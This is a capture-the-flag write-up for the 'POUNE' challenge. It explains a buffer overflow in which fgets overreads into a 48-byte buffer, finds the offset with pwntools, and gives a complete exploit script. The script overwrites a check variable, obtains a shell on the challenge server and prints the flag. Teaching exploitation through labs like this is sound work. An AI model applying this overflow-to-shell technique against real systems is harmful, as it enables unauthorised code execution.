# POUNE

## Description
Solves: 57  Easy

Hello kind sir! 
Can you read flag.txt?

nc challs.ctf.cafe 7777

Author : Zerotistic

## Files
1. Chall.c - The code of the challenge
2. Chall - The compiled binary running on the machine

## Analysis
The source code is providen, so let's take a look:
```c
#include <stdio.h>
#include <stdlib.h>

void main()
{
    int var;
    long int check = 0x04030201;
    char buf[0x30];

    puts("Hello kind sir!");
    printf("My variable \"check\" value is %p.\nCould you change it to 0xc0febabe?\n", check);
    printf("This is the current buffer: %s\n", buf);
    fgets(buf, 0x40, stdin);

    if (check == 0x04030201)
    {
        puts("Mmmh not quite...\n");
    }
    if (check != 0x04030201 && check != 0xc0febabe)
    {
        puts("Mmmh getting closer!...");
        printf("This is the new value of \"check\": %p\n", check);
    }
    if (check == 0xc0febabe)
    {
        puts("Thanks man, you're a life saver!\nHere is your reward, a shell! ");
        system("/bin/sh");
        puts("Bye bye!\n");
    }
}
```

As we can see, this looks just like an easy Buffer OverFlow.

If we do a "$ file ./chall" we can see is a 64b ELF

## Exploit
Vulnerability: It uses the fgets() function, but it takes 0x40 (64) bytes instead of the 0x30 (48) that the buffer can support.

Objetive: We must overwrite the long int check variable to change the value from 0x04030201 to 0xc0febabe.

To obtain when we overwrite the buffer we'll use pwntools
First we generate a large line:
```python
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```
And then put it as entry on running the program:
Hello kind sir!
My variable "check" value is 0x4030201.
Could you change it to 0xc0febabe?
This is the current buffer: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Mmmh getting closer!...
This is the new value of "check": 0x6161706161616f
[Inferior 1 (process 16988) exited with code 0276]

This is little endian, so the new value is 0x6f616161706161 -> oaaapaa, now we just have to change the "oaaapaa" for the new value of the check

The final local exploit should look like this:
```python
from pwn import *

elf = ELF("./chall")
p = elf.process()

payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa' # offset
payload += p64(0xc0febabe) # new "check" value converted to 64b

p.sendline(payload)
p.interactive()
```

It works :)
To make it remote we just have to change lines 3 and 4 to this:
```python
p=remote("challs.ctf.cafe", 7777)
```

And if we run it...
```bash
$ python3 exploit.py 
[+] Opening connection to challs.ctf.cafe on port 7777: Done
[*] Switching to interactive mode
$ cat flag.txt
RUSH{TH1S_WAS_AN_3Z_CH4LLENG3_RIGHT}
$  
```
